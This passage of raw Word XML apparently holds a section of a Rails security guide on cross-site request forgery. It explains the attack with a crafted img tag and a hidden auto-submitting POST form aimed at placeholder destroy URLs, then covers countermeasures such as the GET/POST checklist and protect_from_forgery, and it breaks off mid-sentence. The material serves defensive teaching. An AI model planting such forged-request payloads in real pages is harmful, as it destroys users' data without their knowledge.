                    <a:noFill/>
                    <a:ln w="9525">
                      <a:noFill/>
                      <a:miter lim="800000"/>
                      <a:headEnd/>
                      <a:tailEnd/>
                    </a:ln>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="3C0C6B33" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">In the </w:t>
      </w:r>
      <w:hyperlink r:id="rId698" w:anchor="sessions" w:history="1">
        <w:r>
          <w:rPr>
            <w:rStyle w:val="a3"/>
          </w:rPr>
          <w:t>session chapter</w:t>
        </w:r>
      </w:hyperlink>
      <w:r>
        <w:t xml:space="preserve"> you have learned that most Rails applications use cookie-based sessions. Either they store the session id in the cookie and have a server-side session hash, or the entire session hash is on the client-side. In either case the browser will automatically send along the cookie on every request to a domain, if it can find a cookie for that domain. The controversial point is, that it will also send the cookie, if the request comes from a site of a different domain. Let’s start with an example:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4379666F" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="334"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Bob browses a message board and views a post from a hacker where there is a crafted </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="caps"/>
        </w:rPr>
        <w:t>HTML</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> image element. The element references a command in Bob’s project management application, rather than an image file.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="235B812D" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="334"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>&lt;img src="http://www.webapp.com/project/1/destroy"&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="08774E74" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="334"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:t>Bob’s session at www.webapp.com is still alive, because he didn’t log out a few minutes ago.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="640966F8" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="334"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:t>By viewing the post, the browser finds an image tag. It tries to load the suspected image from www.webapp.com. As explained before, it will also send along the cookie with the valid session id.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="57C02616" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="334"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:t>The web application at www.webapp.com verifies the user information in the corresponding session hash and destroys the project with the ID 1. It then returns a result page which is an unexpected result for the browser, so it will not display the image.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="01820CB6" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="334"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:t>Bob doesn’t notice the attack — but a few days later he finds out that project number one is gone.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="752E591D" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t>It is important to notice that the actual crafted image or link doesn’t necessarily have to be situated in the web application’s domain, it can be anywhere – in a forum, blog post or email.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0E1D93D1" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="caps"/>
        </w:rPr>
        <w:t>CSRF</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> appears very rarely in </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="caps"/>
        </w:rPr>
        <w:t>CVE</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> (Common Vulnerabilities and Exposures) — less than 0.1% in 2006 — but it really is a ‘sleeping giant’ [Grossman]. This is in stark contrast to the results in my (and others) security contract work – </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="caps"/>
          <w:i/>
          <w:iCs/>
        </w:rPr>
        <w:t>CSRF</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="a7"/>
        </w:rPr>
        <w:t xml:space="preserve"> is an important security issue</w:t>
      </w:r>
      <w:r>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1FBC75B2" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="4"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">3.1 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="caps"/>
        </w:rPr>
        <w:t>CSRF</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Countermeasures</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1BFBED0E" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">— </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="a7"/>
        </w:rPr>
        <w:t xml:space="preserve">First, as is required by the W3C, use </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="caps"/>
          <w:i/>
          <w:iCs/>
        </w:rPr>
        <w:t>GET</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="a7"/>
        </w:rPr>
        <w:t xml:space="preserve"> and </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="caps"/>
          <w:i/>
          <w:iCs/>
        </w:rPr>
        <w:t>POST</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="a7"/>
        </w:rPr>
        <w:t xml:space="preserve"> appropriately. Secondly, a security token in non-</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="caps"/>
          <w:i/>
          <w:iCs/>
        </w:rPr>
        <w:t>GET</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="a7"/>
        </w:rPr>
        <w:t xml:space="preserve"> requests will protect your application from </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="caps"/>
          <w:i/>
          <w:iCs/>
        </w:rPr>
        <w:t>CSRF</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="a7"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2AC1FF30" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">The </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="caps"/>
        </w:rPr>
        <w:t>HTTP</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> protocol basically provides two main types of requests – </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="caps"/>
        </w:rPr>
        <w:t>GET</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> and </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="caps"/>
        </w:rPr>
        <w:t>POST</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> (and more, but they are not supported by most browsers). The World Wide Web Consortium (W3C) provides a checklist for choosing </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="caps"/>
        </w:rPr>
        <w:t>HTTP</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="caps"/>
        </w:rPr>
        <w:t>GET</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> or </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="caps"/>
        </w:rPr>
        <w:t>POST</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6F67AAC1" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="aa"/>
        </w:rPr>
        <w:t xml:space="preserve">Use </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="caps"/>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>GET</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="aa"/>
        </w:rPr>
        <w:t xml:space="preserve"> if:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="770E918A" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="335"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">The interaction is more </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="a7"/>
        </w:rPr>
        <w:t>like a question</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> (i.e., it is a safe operation such as a query, read operation, or lookup).</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="04F25CD6" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="aa"/>
        </w:rPr>
        <w:t xml:space="preserve">Use </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="caps"/>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>POST</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="aa"/>
        </w:rPr>
        <w:t xml:space="preserve"> if:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="60E04167" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="336"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">The interaction is more </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="a7"/>
        </w:rPr>
        <w:t>like an order</w:t>
      </w:r>
      <w:r>
        <w:t>, or</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1639E716" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="336"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">The interaction </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="a7"/>
        </w:rPr>
        <w:t>changes the state</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> of the resource in a way that the user would perceive (e.g., a subscription to a service), or</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4662E23A" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="336"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">The user is </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="a7"/>
        </w:rPr>
        <w:t>held accountable for the results</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> of the interaction.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5A8D9D7D" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">If your web application is RESTful, you might be used to additional </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="caps"/>
        </w:rPr>
        <w:t>HTTP</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> verbs, such as </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="caps"/>
        </w:rPr>
        <w:t>PUT</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> or </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="caps"/>
        </w:rPr>
        <w:t>DELETE</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">. Most of today’s web browsers, however do not support them – only </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="caps"/>
        </w:rPr>
        <w:t>GET</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> and </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="caps"/>
        </w:rPr>
        <w:t>POST</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">. Rails uses a hidden </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>_method</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> field to handle this barrier.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="05DFBD20" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="caps"/>
          <w:i/>
          <w:iCs/>
        </w:rPr>
        <w:t>POST</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="a7"/>
        </w:rPr>
        <w:t xml:space="preserve"> requests can be sent automatically, too</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">. Here is an example for a link which displays www.harmless.com as destination in the browser’s status bar. In fact it dynamically creates a new form that sends a </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="caps"/>
        </w:rPr>
        <w:t>POST</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> request.</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="5807"/>
      </w:tblGrid>
      <w:tr w:rsidR="009A002D" w14:paraId="4322BE27" w14:textId="77777777" w:rsidTr="009A002D">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="736719A3" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>&lt;a</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>href="</w:t>
            </w:r>
            <w:hyperlink r:id="rId699" w:history="1">
              <w:r>
                <w:rPr>
                  <w:rStyle w:val="a3"/>
                </w:rPr>
                <w:t>http://www.harmless.com/</w:t>
              </w:r>
            </w:hyperlink>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>"</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>onclick="</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="554F7813" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  var f</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>= document.createElement('form');</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="64BE6677" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  f.style.display</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>= 'none';</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="776DBCD7" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  this.parentNode.appendChild(f);</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="47F28D99" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  f.method</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>= 'POST';</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="3F2F0C69" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  f.action</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>= '</w:t>
            </w:r>
            <w:hyperlink r:id="rId700" w:history="1">
              <w:r>
                <w:rPr>
                  <w:rStyle w:val="a3"/>
                </w:rPr>
                <w:t>http://www.example.com/account/destroy</w:t>
              </w:r>
            </w:hyperlink>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>';</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="0AFBEC38" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  f.submit();</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="7DA1CC2C" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  return false;"&gt;To the harmless survey&lt;/a&gt;</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="26E5B5E9" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t>Or the attacker places the code into the onmouseover event handler of an image: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CD5EB82" w14:textId="77777777" w:rsidTr="009A002D">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="55807A05" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D">
            <w:pPr>
              <w:divId w:val="1073546431"/>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>&lt;img</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>src="</w:t>
            </w:r>
            <w:hyperlink r:id="rId701" w:history="1">
              <w:r>
                <w:rPr>
                  <w:rStyle w:val="a3"/>
                </w:rPr>
                <w:t>http://www.harmless.com/img</w:t>
              </w:r>
            </w:hyperlink>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>"</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>width="400"</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>height="400"</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>onmouseover="..."</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>/&gt;</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="75B89DF5" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t>There are many other possibilities, including Ajax to attack the victim in the background.</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="MS Gothic" w:eastAsia="MS Gothic" w:hAnsi="MS Gothic" w:cs="MS Gothic" w:hint="eastAsia"/>
        </w:rPr>
        <w:t> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t xml:space="preserve">The </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="a7"/>
        </w:rPr>
        <w:t>solution to this is including a security token in non-</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="caps"/>
          <w:i/>
          <w:iCs/>
        </w:rPr>
        <w:t>GET</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="a7"/>
        </w:rPr>
        <w:t xml:space="preserve"> requests</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> which check on the server-side. In Rails 2 or higher, this is a one-liner in the application controller:</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="7968"/>
      </w:tblGrid>
      <w:tr w:rsidR="009A002D" w14:paraId="3B55758D" w14:textId="77777777" w:rsidTr="009A002D">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="4690C800" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D">
            <w:pPr>
              <w:divId w:val="304437951"/>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>protect_from_forgery :secret</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>=&gt; "123456789012345678901234567890..."</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="588B7BFC" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">This will automatically include a security token, calculated from the current session and the server-side secret, in all forms and Ajax requests generated by Rails. You won’t need the secret, if you use CookieStorage as session storage. If the security token doesn’t match what was expected, the session will be reset. </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="aa"/>
        </w:rPr>
        <w:t>Note:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> In Rails versions prior to 3.0.4, this raised an </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>ActionController::InvalidAuthenticityToken</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> error.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7A20639C" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Note that </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="a7"/>
        </w:rPr>
        <w:t>cross-site scripting (</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="caps"/>
          <w:i/>
          <w:iCs/>
        </w:rPr>
        <w:t>XSS</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="a7"/>
        </w:rPr>
        <w:t xml:space="preserve">) vulnerabilities bypass all </w:t>
      </w:r>
      <w:r>
        <w:rPr>
